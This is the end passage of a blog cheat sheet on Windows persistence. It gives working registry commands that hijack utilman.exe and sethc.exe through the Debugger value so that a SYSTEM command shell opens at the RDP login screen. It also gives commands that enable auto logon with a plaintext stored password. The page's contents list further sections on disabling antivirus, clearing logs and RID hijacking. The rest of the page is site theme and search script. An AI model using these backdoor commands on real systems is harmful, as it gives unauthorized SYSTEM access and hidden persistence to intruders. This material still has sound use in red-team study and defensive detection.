+<h1 id="RDP-Backdoor"><a href="#RDP-Backdoor" class="headerlink" title="RDP Backdoor"></a>RDP Backdoor</h1><h2 id="Utilman-exe"><a href="#Utilman-exe" class="headerlink" title="Utilman.exe"></a>Utilman.exe</h2><p>At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<h2 id="sethc-exe"><a href="#sethc-exe" class="headerlink" title="sethc.exe"></a>sethc.exe</h2><p>Hit F5 a bunch of times when you are at the RDP login screen.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /t REG_SZ /v Debugger /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<h1 id="Auto-Logon"><a href="#Auto-Logon" class="headerlink" title="Auto Logon"></a>Auto Logon</h1><p>Note: apparently doesn’t work on RDP anymore.</p>
+<ol>
+<li>Win + R</li>
+<li><code>netplwiz</code></li>
+<li>Uncheck “Users must enter a user name and password to use this computer”</li>
+</ol>
+<p>If option not there, add this reg key:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device&quot;</span> /v DevicePasswordLessBuildVersion /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure>
+
+<p>Alternatively, set value “AutoAdminLogon” to <code>1</code> in  <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code> and fill out <code>DefaultUserName</code> and <code>DefaultPassword</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v AutoAdminLogon /t REG_SZ <span class="literal">-d</span> <span class="number">1</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultUserName /t REG_SZ <span class="literal">-d</span> <span class="string">&quot;kage&quot;</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> /v DefaultPassword /t REG_SZ <span class="literal">-d</span> <span class="string">&quot;kage&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-03-05 20:30:12
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Disable-Antivirus-and-Security"><span class="toc-text">Disable Antivirus and Security</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Disable-Firewalls"><span class="toc-text">Disable Firewalls</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Clear-Logs"><span class="toc-text">Clear Logs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Credentials"><span class="toc-text">Credentials</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tampering-With-Accounts"><span class="toc-text">Tampering With Accounts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Assign-Group-Memberships"><span class="toc-text">Assign Group Memberships</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Special-Privileges-and-Security-Descriptors"><span class="toc-text">Special Privileges and Security Descriptors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RID-Hijacking"><span class="toc-text">RID Hijacking</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HKCU-HKLM-Registry-Autoruns"><span class="toc-text">HKCU &#x2F; HKLM Registry Autoruns</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Startup-Folder"><span class="toc-text">Startup Folder</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scheduled-Tasks"><span class="toc-text">Scheduled Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Making-Our-Tasks-Invisible"><span class="toc-text">Making Our Tasks Invisible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BITS-Jobs"><span class="toc-text">BITS Jobs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RDP-Backdoor"><span class="toc-text">RDP Backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Utilman-exe"><span class="toc-text">Utilman.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sethc-exe"><span class="toc-text">sethc.exe</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Auto-Logon"><span class="toc-text">Auto Logon</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/kagehayashi">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/kagehayashi">Copyright © 2024 KageHayashi</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        ▰▰▰
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Windows%20Persistence + '&url=' + https%3A%2F%2Fkagehayashi.com%2Fwindows-persistence%2Findex.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://kagehayashi.com/windows-persistence/index.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
